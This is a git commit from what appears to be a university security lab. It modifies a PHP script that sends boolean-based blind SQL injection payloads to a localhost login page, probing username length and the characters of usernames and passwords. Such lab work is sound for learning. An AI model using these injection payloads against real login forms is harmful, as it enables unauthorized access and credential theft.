f4c05a7c5fd91f10ee90612be7d2f6c9d76dd412
KendalYaman <kendal.yaman.001@student.uni.lu>
2019-05-16 11:37:37 +0200

    test

--- script.php
+++ script.php
@@ -1,7 +1,17 @@
 <?php
 //$url="http://localhost/lab09/login.php?u=\"%20or%20username%20=%20%27admin%27%20--%20";
-$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(username,1,1)%20=%20%27a%27%20--%20";
+//$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(username,1,1)%20=%20%27a%27%20--%20"; // Celui fonctionne
 //$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20"
+
+$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%209-%20";
+/*$counter = 0;
+while ($counter < 25)
+{
+    
+}*/
+
+
+
 $result = file_get_contents($url);
 
 print($result);
